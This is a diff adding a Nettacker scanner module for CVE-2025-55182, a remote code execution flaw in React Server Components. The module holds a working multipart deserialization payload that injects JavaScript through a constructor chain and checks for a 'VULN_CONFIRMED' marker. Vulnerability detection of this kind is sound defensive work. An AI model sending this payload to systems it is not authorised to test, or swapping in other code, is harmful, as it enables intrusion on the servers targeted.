@@ -1,0 +1,53 @@
+info:
+  name: next_cve_2025_55182_vuln
+  author: Sankalp Bansal
+  severity: 10.0
+  description: critical unauthenticated RCE vulnerability exploiting improper input deserialization within React Server Components (RSC).
+  reference:
+    - https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-components
+    - https://www.wiz.io/blog/nextjs-cve-2025-55182-react2shell-deep-dive
+    - https://x.com/rauchg/status/1997362942929440937?s=46&t=JS55_O2JZmKWQpZHLAse_A
+    - https://github.com/lachlan2k/React2Shell-CVE-2025-55182-original-poc/blob/main/01-submitted-poc.js
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve
+    - cve2025
+    - react
+    - waku
+    - rce
+
+payloads:
+  - library: http
+    steps:
+      - method: post
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          Content-Type: "multipart/form-data; boundary=NETTACKER"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/RSC/foo.txt"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+        data: "--NETTACKER\r\nContent-Disposition: form-data; name=\"0\"\r\n\r\n\"$1\"\r\n--NETTACKER\r\nContent-Disposition: form-data; name=\"1\"\r\n\r\n{{\"status\":\"resolved_model\",\"reason\":0,\"_response\":\"$4\",\"value\":\"{{\\\"then\\\":\\\"$3:map\\\",\\\"0\\\":{{\\\"then\\\":\\\"$B3\\\"}},\\\"length\\\":1}}\",\"then\":\"$2:then\"}}\r\n--NETTACKER\r\nContent-Disposition: form-data; name=\"2\"\r\n\r\n\"$@3\"\r\n--NETTACKER\r\nContent-Disposition: form-data; name=\"3\"\r\n\r\n[]\r\n--NETTACKER\r\nContent-Disposition: form-data; name=\"4\"\r\n\r\n{{\"_prefix\":\"throw new Error(\\\"VULN_CONFIRMED\\\")//\",\"_formData\":{{\"get\":\"$3:constructor:constructor\"}},\"_chunks\":\"$2:_response:_chunks\"}}\r\n--NETTACKER--\r\n"
+
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: "200|500"
+              reverse: false
+            content:
+              regex: "VULN_CONFIRMED"
+              reverse: false
